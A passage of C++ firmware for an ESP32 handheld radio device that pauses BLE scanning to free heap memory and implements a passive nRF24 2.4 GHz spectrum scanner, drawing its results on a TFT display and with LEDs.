  if (bgBleScanTaskHandle != nullptr) xTaskNotifyGive(bgBleScanTaskHandle);
  if (bgBleScanRunning) stopBgBleScanIfRunning();
  const uint32_t started = millis();
  while (bgBleScanTaskHandle != nullptr &&
         (!bgBleScanPausedAck || bgBleScanRunning) &&
         (uint32_t)(millis() - started) < 6500u) {
    if (bgBleScanRunning && bleScan) bleScan->stop();
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  if (bgBleScanRunning || !bgBleScanPausedAck) {
    Serial.printf("[autoscan] BLE pause timeout running=%u ack=%u heap=%u largest=%u\n",
                  bgBleScanRunning ? 1u : 0u, bgBleScanPausedAck ? 1u : 0u,
                  (unsigned)ESP.getFreeHeap(),
                  (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
    return;
  }
  autoScanReleaseBle();
  if (!bgBleScanRunning && !fgBleScanInProgress && bleInitDone && bleScan) {
    // NimBLE keeps one heap allocation per advertiser after a scan. The DIV
    // has no PSRAM, so retaining the automatic scan cache can leave too little
    // contiguous heap for esp_vfs_fat_register() when SD File Manager starts.
    // Drop our shallow result copy before the scanner deletes the owned
    // devices, preventing dangling pointers as well as reclaiming the heap.
    bleResults = BLEScanResults();
    bleScan->clearResults();
    bgHasResults = false;
    bgLastScanMs = 0;
  }
  Serial.printf("[autoscan] BLE parked heap=%u largest=%u\n",
                (unsigned)ESP.getFreeHeap(),
                (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
}

bool releaseControllerForWifi() {
  pauseBackgroundScanner();
  if (bgBleScanRunning || fgBleScanInProgress || !bgBleScanPausedAck) {
    Serial.println(F("[ble] controller release refused: scanner still active"));
    return false;
  }

  // Clear scan-owned advertiser records before stopping NimBLE.  Keep the
  // NimBLE objects themselves (clearAll=false): several BLE screens retain
  // pointers to those reusable objects, while the controller/host allocations
  // are the memory that DHCP and lwIP need during a captive-portal session.
  bleResults = BLEScanResults();
  if (bleInitDone && bleScan) {
    bleScan->clearResults();
  }
  bgHasResults = false;
  bgLastScanMs = 0;

  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(false);
  }
  bleInitDone = false;
  bleScan = nullptr;

  const bool released = !BLEDevice::getInitialized();
  Serial.printf("[ble] controller release=%s heap=%u largest=%u\n",
                released ? "OK" : "FAILED",
                (unsigned)ESP.getFreeHeap(),
                (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
  return released;
}

int getLastCount() {

  if (!settings().autoBleScan) return 0;
  return bleResults.getCount();
}

void exit() {
  fgBleScanInProgress = false;
  if (bgBleScanRunning) {
    stopBgBleScanIfRunning();
  }
  if (isScanning && bleScan) {
    bleScan->stop();
    isScanning = false;
  }
}
}

namespace Scanner {

#define CE  configuredNrfAuxCePin()
#define CSN configuredNrfAuxCsnPin()

#define CHANNELS  ESP32DIV_BLE_SCANNER_CHANS
int channel[CHANNELS];

#define N ESP32DIV_BLE_SCANNER_BARS
uint8_t values[N];

static bool uiDrawn = false;

static constexpr uint16_t SCAN_SWEEPS        = 25;
static constexpr uint16_t DISPLAY_SWEEPS     = 10;
static constexpr uint16_t RX_SETTLE_US       = 100;
static constexpr uint16_t RPD_DWELL_US       = 50;
static constexpr uint32_t UI_THROTTLE_MS     = 35;
static constexpr uint16_t BUTTON_POLL_STRIDE = 8;

#define _NRF24_CONFIG   0x00
#define _NRF24_EN_AA    0x01
#define _NRF24_EN_RXADDR 0x02
#define _NRF24_RF_CH    0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_STATUS   0x07
#define _NRF24_RPD      0x09

static constexpr uint8_t NRF_CMD_FLUSH_TX = 0xE1;
static constexpr uint8_t NRF_CMD_FLUSH_RX = 0xE2;

int backgroundNoise[CHANNELS] = {0};

volatile bool scanning = true;
static bool s_radioReady = false;

static constexpr int kScannerGraphTop = 190;
static constexpr int kScannerLogBottom = kScannerGraphTop - 6;
static constexpr int kScannerToolbarBottom = 36;
static constexpr int kScannerToolbarGap = 8;
static constexpr int kScannerBoxPad = 4;
static constexpr int kScannerBoxHeaderH = 15;
static constexpr int kScannerStatusY = kScannerToolbarBottom + kScannerToolbarGap;
static constexpr int kScannerGraphMarginX = 6;
static constexpr int kScannerBarColGap = 10;
#if BOARD_HAS_ESP32S3
static constexpr int kScannerBarsPerCol = 64;
#else
static constexpr int kScannerBarsPerCol = 32;
#endif
static constexpr int kScannerStatusLineCount = 6;
static constexpr int kScannerStatusTextY = kScannerStatusY + kScannerBoxHeaderH;
static constexpr int kScannerStatusBoxH = 91;
static constexpr int kScannerLogGap = 4;
static constexpr int kScannerLogBoxH = 49;
static constexpr int kScannerLogBoxTop = kScannerStatusY + kScannerStatusBoxH + kScannerLogGap;
static constexpr int kScannerLogStartY = kScannerLogBoxTop + kScannerBoxHeaderH;
static constexpr int kScannerLogEndY = kScannerLogBoxTop + kScannerLogBoxH - 2;

#define SCREEN_HEIGHT 180
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

bool isSelectButtonPressed() {
  return isButtonPressed(BTN_SELECT);
}

byte getRegister(byte r) {
  byte c;
  SPI.beginTransaction(SPISettings(kNrfSpiHz, MSBFIRST, SPI_MODE0));
  digitalWrite(CSN, LOW);
  delayMicroseconds(1);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0xFF);
  delayMicroseconds(1);
  digitalWrite(CSN, HIGH);
  SPI.endTransaction();
  return c;
}

bool carrierDetected() {
  return getRegister(_NRF24_RPD) & 0x01;
}

void setRegister(byte r, byte v) {
  SPI.beginTransaction(SPISettings(kNrfSpiHz, MSBFIRST, SPI_MODE0));
  digitalWrite(CSN, LOW);
  delayMicroseconds(1);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  delayMicroseconds(1);
  digitalWrite(CSN, HIGH);
  SPI.endTransaction();
}

void disable();

static void scannerCommand(uint8_t command) {
  SPI.beginTransaction(SPISettings(kNrfSpiHz, MSBFIRST, SPI_MODE0));
  digitalWrite(CSN, LOW);
  delayMicroseconds(1);
  SPI.transfer(command);
  delayMicroseconds(1);
  digitalWrite(CSN, HIGH);
  SPI.endTransaction();
}

// A previous nRF feature can legitimately leave RX_DR asserted, a payload in
// the FIFO and the radio in PWR_DOWN/PRIM_RX.  Register readability alone is
// therefore not enough to declare Scanner ready.  Establish a deterministic
// carrier-detect baseline before the first sweep.
static void scannerResetRadioState() {
  disable();
  delayMicroseconds(20);
  setRegister(_NRF24_CONFIG, 0x00);  // PWR_DOWN while registers/FIFOs reset
  setRegister(_NRF24_STATUS, 0x70);  // clear RX_DR/TX_DS/MAX_RT
  scannerCommand(NRF_CMD_FLUSH_RX);
  scannerCommand(NRF_CMD_FLUSH_TX);
  setRegister(_NRF24_EN_AA, 0x00);
  setRegister(_NRF24_EN_RXADDR, 0x01);
  setRegister(_NRF24_RF_CH, 0x00);
  setRegister(_NRF24_RF_SETUP, 0x0F);
  setRegister(_NRF24_CONFIG, 0x03);  // PWR_UP | PRIM_RX
  delayMicroseconds(1600);           // nRF24 power-down -> standby startup
  setRegister(_NRF24_STATUS, 0x70);
  scannerCommand(NRF_CMD_FLUSH_RX);
  disable();
}

void setChannel(uint8_t channel) {
  setRegister(_NRF24_RF_CH, channel);
}

void powerUp() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
  delayMicroseconds(130);
}

void powerDown() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) & ~0x02);
}

void enable() {
  digitalWrite(CE, HIGH);
}

void disable() {
  digitalWrite(CE, LOW);
}

void setRX() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x01);
  enable();
  delayMicroseconds(100);
}

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const bool scrolled = (Index >= MAX_LINES - 1);
  if (scrolled) {
    scroll();
    Index = MAX_LINES - 1;
  }

  const int firstNewIndex = Index;
  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  static auto redrawLogLine = [](int bufIndex) {
    if (bufIndex < 3) {
      return;
    }
    const int yPos = kScannerLogStartY + (bufIndex - 3) * LINE_HEIGHT;
    if (yPos + LINE_HEIGHT > kScannerLogEndY) {
      return;
    }
    tft.fillRect(8, yPos, tft.width() - 16, LINE_HEIGHT, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(Buffercolor[bufIndex], TFT_BLACK);
    tft.setCursor(8, yPos);
    tft.print(Buffer[bufIndex]);
  };

  if (scrolled) {
    for (int i = 3; i < Index; i++) {
      redrawLogLine(i);
    }
    return;
  }

  for (int i = firstNewIndex; i < Index; i++) {
    redrawLogLine(i);
  }
}

static unsigned long s_scannerLastBtnMs = 0;
static constexpr unsigned long kScannerNavDebounceMs = 80;

void calibrateBackgroundNoise();
void scan();
static String scannerChannelGHzText(int ch);
static String scannerBandHint(int ch);

static void scannerWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

void scannerHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_scannerLastBtnMs < kScannerNavDebounceMs) {
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    calibrateBackgroundNoise();
    s_scannerLastBtnMs = millis();
    scannerWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    scan();
    s_scannerLastBtnMs = millis();
    scannerWaitNavRelease(BTN_DOWN);
  }
}

static void scannerPollNavButtons() {
  maintainTouchNavBar();
  if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
    feature_exit_requested = true;
    scanning = false;
    return;
  }
  scannerHandleNavButtons();
}

void calibrateBackgroundNoise() {

  if (!s_radioReady) {
    Print("[!] NRF bus unavailable", UI_WARN, false);
    return;
  }

  Print("[!] Calibrating noise floor...", UI_TEXT, false);

  for (int i = 0; i < 2; i++) {
    disable();
    for (int j = 0; j < 50; j++) {
      for (int i = 0; i < CHANNELS; i++) {
        if ((i % BUTTON_POLL_STRIDE) == 0) {
          scannerPollNavButtons();
        }

        setRegister(_NRF24_RF_CH, (uint8_t)i);
        enable();
        delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
        disable();
        if (carrierDetected()) channel[i]++;
      }
    }
    for (int j = 0; j < CHANNELS; j++) {
      backgroundNoise[j] += channel[j];

    }
  }

  int maxNoiseCh = 0;
  int maxNoise = 0;
  for (int i = 0; i < CHANNELS; i++) {
    backgroundNoise[i] /= 5;
    if (backgroundNoise[i] > maxNoise) {
      maxNoise = backgroundNoise[i];
      maxNoiseCh = i;
    }
  }

  Print("[+] Calibrate done  Ch" + String(maxNoiseCh) + " " + scannerChannelGHzText(maxNoiseCh) + "GHz", UI_WARN, false);
}

void scan() {
  if (!s_radioReady) {
    Print("[!] NRF bus unavailable", UI_WARN, false);
    return;
  }
  Print("[!] Scan refresh...", UI_TEXT, false);
  memset(channel, 0, sizeof(channel));
  disable();
  for (int j = 0; j < 50; j++) {
    for (int i = 0; i < CHANNELS; i++) {
      if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;
    }
  }

  int peakCh = 0;
  int peakHits = 0;
  int active = 0;
  for (int i = 0; i < CHANNELS; i++) {
    if (channel[i] > 0) {
      active++;
    }
    if (channel[i] > peakHits) {
      peakHits = channel[i];
      peakCh = i;
    }
  }
  if (peakHits > 0) {
    Print("[+] Scan done  " + String(active) + " hit(s)  peak Ch" + String(peakCh), UI_WARN, false);
  } else {
    Print("[*] Scan done  no carriers", UI_DIM_TEXT, false);
  }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {

    tft.fillRect(0, 20, 160, 16, DARK_GRAY);
    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(35, 24);
    tft.print("2.4GHz Scanner");

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], UI_ICON);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0: calibrateBackgroundNoise(); break;
        case 1: scan(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;

                scanning = false;
              } else {

                drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void scanChannels() {
  disable();
  static uint32_t lastUI = 0;
  for (int j = 0; j < (int)SCAN_SWEEPS && scanning; j++) {
    for (int i = 0; i < CHANNELS && scanning; i++) {

      if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
        scanning = false;
        Print("Scan interrupted by user", UI_WARN, true);
        return;
      }
      if (feature_exit_requested || featureExitButtonPressed()) {
        scanning = false;
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;

      uint32_t now = millis();
      if (now - lastUI >= UI_THROTTLE_MS) {
        runUI();
        scannerPollNavButtons();
        lastUI = now;
        delay(0);
        if (feature_exit_requested || featureExitButtonPressed()) {
          scanning = false;
          return;
        }
      } else if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }
    }
  }
}

void outputChannels() {
  int norm = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if (channel[i] > norm) norm = channel[i];
  }
  static uint32_t lastUI = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
      scanning = false;
      Print("Output interrupted by user", UI_WARN, true);
      return;
    }
    int strength = (norm != 0) ? (channel[i] * 10) / norm : 0;
    (void)strength;
    channel[i] = 0;
    uint32_t now = millis();
    if (now - lastUI >= UI_THROTTLE_MS) {
      runUI();
      scannerPollNavButtons();
      lastUI = now;
      delay(0);
    } else if ((i % BUTTON_POLL_STRIDE) == 0) {
      scannerPollNavButtons();
    }
  }
}

struct ScannerPlotLayout {
  int graphTop = 0;
  int axisX = 10;
  int plotRight = 0;
  int plotTop = 0;
  int plotBottom = 0;
  int plotHeight = 0;
  int plotWidth = 0;
  int maxBarHeight = 0;
  bool valid = false;
};

static ScannerPlotLayout s_plot;
static uint8_t s_smoothValues[N];
static uint8_t s_prevBarPx[N];
static bool s_graphChromeDrawn = false;
static int s_lastPeakCh = -1;
static uint8_t s_lastPeakVal = 0;
static int s_peakMarkerX = -1;
static int s_statusPeakCh = -1;
static uint8_t s_statusPeakVal = 0;
static int s_statusActive = -1;
static int s_statusPctBucket = -1;
static uint32_t s_lastStatusDrawMs = 0;
static String s_statusLineText[kScannerStatusLineCount];
static uint16_t s_statusLineColor[kScannerStatusLineCount];
static bool s_statusStaticDrawn = false;


static int scannerBarCol0X() {
  const int barsSpan = (kScannerBarsPerCol * 2) + kScannerBarColGap;
  return s_plot.axisX + max(0, (s_plot.plotWidth - barsSpan) / 2);
}

static int scannerBarX(int ch) {
  const int col0 = scannerBarCol0X();
  if (ch < kScannerBarsPerCol) {
    return col0 + ch;
  }
  return col0 + kScannerBarsPerCol + kScannerBarColGap + (ch - kScannerBarsPerCol);
}

static constexpr int kScannerGridDivisions = 4;
static constexpr int kScannerMinBarPx = 5;

static int scannerHorizGridY(int lineIndex) {
  return s_plot.plotTop + ((s_plot.plotHeight * lineIndex) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
}

static void scannerDrawHorizGridLines() {
  for (int g = 1; g < kScannerGridDivisions; g++) {
    const int gy = scannerHorizGridY(g);
    tft.drawFastHLine(s_plot.axisX + 1, gy, s_plot.plotWidth - 2, 0x2945);
  }
}

static void scannerDrawVertGridLines() {
  for (int v = 1; v < kScannerGridDivisions; v++) {
    const int vx = s_plot.axisX + ((s_plot.plotWidth * v) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
    tft.drawFastVLine(vx, s_plot.plotTop + 1, s_plot.plotHeight - 2, 0x2945);
  }
}

static void scannerResetGraphState() {
  s_graphChromeDrawn = false;
  s_plot.valid = false;
  memset(s_smoothValues, 0, sizeof(s_smoothValues));
  memset(s_prevBarPx, 0, sizeof(s_prevBarPx));
  memset(values, 0, sizeof(values));
  s_lastPeakCh = -1;
  s_lastPeakVal = 0;
  s_peakMarkerX = -1;
  s_statusPeakCh = -1;
  s_statusPeakVal = 0;
  s_statusActive = -1;
  s_statusPctBucket = -1;
  s_lastStatusDrawMs = 0;
  s_statusStaticDrawn = false;
  for (int i = 0; i < kScannerStatusLineCount; i++) {
    s_statusLineText[i] = "";
    s_statusLineColor[i] = 0;
  }
}

static void scannerRestoreColumnDecor(int x) {
  if (!s_plot.valid) {
    return;
  }
  for (int g = 1; g < kScannerGridDivisions; g++) {
    const int gy = scannerHorizGridY(g);
    if (gy > s_plot.plotTop && gy < s_plot.plotBottom) {
      tft.drawPixel(x, gy, 0x2945);
    }
  }
  for (int v = 1; v < kScannerGridDivisions; v++) {
    const int vx = s_plot.axisX + ((s_plot.plotWidth * v) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
    if (vx == x) {
      tft.drawFastVLine(vx, s_plot.plotTop + 1, s_plot.plotHeight - 2, 0x2945);
      break;
    }
  }
}

static void scannerEnsurePlotLayout() {
  const int screenW = tft.width();
  s_plot.graphTop = kScannerGraphTop;
  s_plot.axisX = kScannerGraphMarginX;
  s_plot.plotRight = screenW - kScannerGraphMarginX;
  s_plot.plotTop = s_plot.graphTop + 12;
  s_plot.plotBottom = bleContentBottom() - 13;
  s_plot.plotHeight = s_plot.plotBottom - s_plot.plotTop;
  s_plot.plotWidth = s_plot.plotRight - s_plot.axisX;
  s_plot.maxBarHeight = s_plot.plotHeight;
  s_plot.valid = s_plot.plotWidth >= 32 && s_plot.plotHeight >= 10;
}

static void scannerDrawGraphChrome() {
  scannerEnsurePlotLayout();
  if (!s_plot.valid) {
    return;
  }

  const int screenW = tft.width();
  const int graphBottom = bleContentBottom() - 2;
  tft.fillRect(0, kScannerLogBottom, screenW, graphBottom - kScannerLogBottom + 2, TFT_BLACK);
  tft.fillRect(s_plot.axisX, s_plot.plotTop, s_plot.plotWidth, s_plot.plotHeight, 0x0842);

  scannerDrawHorizGridLines();
  scannerDrawVertGridLines();

  tft.drawRect(s_plot.axisX, s_plot.plotTop, s_plot.plotWidth, s_plot.plotHeight, UI_LINE);
  tft.drawLine(s_plot.axisX, s_plot.plotTop, s_plot.axisX, s_plot.plotBottom, WHITE);
  tft.drawLine(s_plot.axisX, s_plot.plotBottom, s_plot.plotRight, s_plot.plotBottom, WHITE);

  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("2.4 GHz Spectrum", (screenW - 96) / 2, s_plot.graphTop + 2);

  const int labelY = s_plot.plotBottom + 2;
  const int endMhz = 2400 + N - 1;
  char lo[8], mid[8], hi[8];
  snprintf(lo, sizeof(lo), "2.40");
  snprintf(mid, sizeof(mid), "2.%02u", (unsigned)((2400 + N / 2) % 100));
  snprintf(hi, sizeof(hi), "2.%02u", (unsigned)(endMhz % 100));
  tft.drawString(lo, s_plot.axisX + 2, labelY);
  tft.drawString(mid, s_plot.axisX + s_plot.plotWidth / 2 - 8, labelY);
  tft.drawString(hi, s_plot.plotRight - 24, labelY);

  s_graphChromeDrawn = true;
  memset(s_prevBarPx, 0, sizeof(s_prevBarPx));
  s_lastPeakCh = -1;
  s_lastPeakVal = 0;
  s_peakMarkerX = -1;
}

static void scannerFindPeak(const uint8_t* vals, int count, int& peakCh, uint8_t& peakVal) {
  peakCh = 0;
  peakVal = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] > peakVal) {
      peakVal = vals[i];
      peakCh = i;
    }
  }
}

static String scannerChannelGHzText(int ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return String(buf);
}

static String scannerBandHint(int ch) {
  if (ch == 2 || ch == 26 || ch == 80) {
    return "BLE";
  }
  if (ch >= 10 && ch <= 15) {
    return "WiFi Ch1";
  }
  if (ch >= 34 && ch <= 40) {
    return "WiFi Ch6";
  }
  if (ch >= 59 && ch <= 65) {
    return "WiFi Ch11";
  }
  if (ch >= 76 && ch <= 86) {
    return "RC/Video";
  }
  return "ISM";
}

static String scannerChannelBandLine(int ch) {
  return "Ch " + String(ch) + "  " + scannerBandHint(ch);
}

static String scannerFitStatusText(const String& text) {
  const int maxWidth = tft.width() - 16;
  tft.setTextSize(1);
  if (tft.textWidth(text) <= maxWidth) {
    return text;
  }
  String out = text;
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (!out.isEmpty()) {
    out += "...";
  }
  return out;
}

static int scannerCountActiveChannels(const uint8_t* vals, int count) {
  int active = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] >= 3) {
      active++;
    }
  }
  return active;
}

static void scannerUpdateLedFeedback(uint8_t strengthPct) {
  // Match the useful visual language of SubGHz Jamming Detector without
  // coupling this screen to its radio state.  All timing is non-blocking and
  // derives only from the already-computed scanner strength, so this adds no
  // SPI/SD traffic and does not change the nRF sweep cadence.
  static bool pulsePhase = false;
  static uint32_t lastPulseMs = 0;
  const uint32_t now = millis();

  uint16_t intervalMs = 420;  // quiet: slow blue heartbeat
  uint8_t r = 0;
  uint8_t g = 70;
  uint8_t b = 210;
  if (strengthPct >= 70) {
    intervalMs = 110;          // high activity: fast magenta warning
    r = 255;
    g = 0;
    b = 90;
  } else if (strengthPct >= 35) {
    intervalMs = 190;          // medium activity: amber pulse
    r = 255;
    g = 150;
    b = 0;
  } else if (strengthPct > 0) {
    intervalMs = 290;          // low activity: cyan pulse
    r = 0;
    g = 190;
    b = 255;
  }

  if ((uint32_t)(now - lastPulseMs) >= intervalMs) {
    pulsePhase = !pulsePhase;
    lastPulseMs = now;
  }
  neopixelShowActivityColor(r, g, b, pulsePhase);
}

static void scannerDrawStatusLine(int line, const String& text, uint16_t color) {
  const int y = kScannerStatusTextY + line * LINE_HEIGHT;
  const String fitted = scannerFitStatusText(text);
  tft.fillRect(8, y, tft.width() - 16, LINE_HEIGHT, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(8, y);
  tft.print(fitted);
}

static void scannerDrawStatusLineIfChanged(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kScannerStatusLineCount) {
    return;
  }
  if (s_statusLineText[line] == text && s_statusLineColor[line] == color) {
    return;
  }
  s_statusLineText[line] = text;
  s_statusLineColor[line] = color;
  scannerDrawStatusLine(line, text, color);
}

static void scannerDrawTextBoxes() {
  tft.fillRect(0, kScannerStatusY - 2, tft.width(), kScannerLogBottom - kScannerStatusY + 2, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kScannerStatusY, tft.width() - 8, kScannerStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kScannerLogBoxTop, tft.width() - 8, kScannerLogBoxH, 3, UI_LINE);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("RF Status", 8, kScannerStatusY + 3);
  tft.drawString("Activity", 8, kScannerLogBoxTop + 3);
}

static void scannerDrawStaticStatusLines() {
  if (s_statusStaticDrawn) {
    return;
  }
  char rangeLine[40];
  snprintf(rangeLine, sizeof(rangeLine), "Range: 2.4-2.528 GHz  %d ch", N);
  scannerDrawStatusLineIfChanged(4, rangeLine, UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(5, "State: Monitoring", UI_DIM_TEXT);
  s_statusStaticDrawn = true;
}

static void scannerUpdateStatusPanel(const uint8_t* vals, int count) {
  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);
  const int active = scannerCountActiveChannels(vals, count);

  const int pct = peakVal > 0 ? min(100, ((int)peakVal * 100) / 64) : 0;
  const int pctBucket = pct / 3;
  const uint32_t now = millis();
  if (peakCh == s_statusPeakCh && pctBucket == s_statusPctBucket &&
      active == s_statusActive && now - s_lastStatusDrawMs < 200) {
    return;
  }
  s_statusPeakCh = peakCh;
  s_statusPeakVal = peakVal;
  s_statusActive = active;
  s_statusPctBucket = pctBucket;
  s_lastStatusDrawMs = now;

  scannerDrawStaticStatusLines();

  if (peakVal == 0) {
    scannerDrawStatusLineIfChanged(0, "Peak: none", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(1, "Ch --  --", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(2, "Strength: 0%", UI_DIM_TEXT);
  } else {
    scannerDrawStatusLineIfChanged(0, "Peak: " + scannerChannelGHzText(peakCh) + " GHz", UI_TEXT);
    scannerDrawStatusLineIfChanged(1, scannerChannelBandLine(peakCh), UI_TEXT);
    scannerDrawStatusLineIfChanged(2, "Strength: " + String(pct) + "%", UI_TEXT);
  }

  scannerDrawStatusLineIfChanged(3, "Active: " + String(active) + " channel(s)", active > 0 ? UI_OK : UI_DIM_TEXT);

  // Reactive four-pixel pattern: quiet/low/medium/high activity changes both
  // colour and pulse speed, like SubGHz Jamming Detector.  This replaces the
  // old percentage bar which commonly left only one LED illuminated.
  scannerUpdateLedFeedback((uint8_t)pct);

  static uint32_t s_lastScannerDiagMs = 0;
  if (now - s_lastScannerDiagMs >= 2000) {
    s_lastScannerDiagMs = now;
    Serial.printf("[scanner] active=%d peakCh=%d peak=%u cfg=%02X status=%02X\n",
                  active, peakCh, (unsigned)peakVal,
                  (unsigned)getRegister(_NRF24_CONFIG),
                  (unsigned)getRegister(_NRF24_STATUS));
  }
}

static void scannerClearPeakMarker() {
  if (!s_plot.valid || s_peakMarkerX < 0) {
    return;
  }
  tft.drawPixel(s_peakMarkerX, s_plot.plotTop + 1, 0x0842);
  s_peakMarkerX = -1;
}

static void scannerUpdatePeakMarker(const uint8_t* vals, int count) {
  if (!s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);

  if (peakCh == s_lastPeakCh && peakVal == s_lastPeakVal) {
    return;
  }
  s_lastPeakCh = peakCh;
  s_lastPeakVal = peakVal;

  scannerClearPeakMarker();
  if (peakVal == 0) {
    return;
  }

  const int markerX = scannerBarX(peakCh);
  tft.drawPixel(markerX, s_plot.plotTop + 1, WHITE);
  s_peakMarkerX = markerX;
}

static void scannerUpdateBarColumn(int ch, int newPx, int oldPx) {
  if (!s_plot.valid) {
    return;
  }
  const int x = scannerBarX(ch);
  const uint16_t bg = 0x0842;

  if (newPx < oldPx) {
    tft.fillRect(x, s_plot.plotBottom - oldPx, 1, oldPx - newPx, bg);
    scannerRestoreColumnDecor(x);
  }
  if (newPx > oldPx) {
    tft.fillRect(x, s_plot.plotBottom - newPx, 1, newPx - oldPx, UI_WARN);
  }
  s_prevBarPx[ch] = (uint8_t)newPx;
}

static void scannerSmoothFrame(const uint8_t* frameHits, int count) {
  for (int i = 0; i < count; i++) {
    if (frameHits[i] > 0) {
      int blended = (((int)s_smoothValues[i] * 3) + ((int)frameHits[i] * 5)) / 8;
      if (blended < (int)frameHits[i]) {
        blended = frameHits[i];
      }
      s_smoothValues[i] = (uint8_t)min(255, blended);
    } else if (s_smoothValues[i] > 2) {
      s_smoothValues[i] = (uint8_t)(((int)s_smoothValues[i] * 7) / 8);
    } else if (s_smoothValues[i] > 0) {
      s_smoothValues[i]--;
